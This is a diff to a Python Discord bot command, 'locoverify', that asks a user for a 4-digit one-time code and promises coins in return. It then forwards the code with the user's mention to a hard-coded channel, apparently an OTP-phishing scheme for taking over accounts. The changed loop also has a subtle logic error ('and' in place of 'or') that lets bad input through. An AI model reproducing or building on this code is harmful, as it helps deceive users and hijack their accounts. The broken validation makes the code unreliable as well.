@@ -72,20 +72,12 @@ async def locoverify(ctx, user: discord.Member):
             otp = await client.wait_for_message(author=user)
             otp = otp.content
             c = True
-            while c:
-                try:
-                    otp = int(otp)
-                    otp = str(otp)
-                    if len(otp) != 4:
-                        c = True
-                    else:
-                        await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
-                        await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
-                        c = False
-                except ValueError:
-                    await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
-                    otp = await client.wait_for_message(author=user)
-                    otp = otp.content
+            while len(otp)!=4 and not otp.isdigit():
+                await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
+                otp = await client.wait_for_message(author=user)
+                otp = otp.content
+            await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
+            await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
     else:
         await client.send_message(ctx.message.channel, "This bot isn't made for DMs")
 
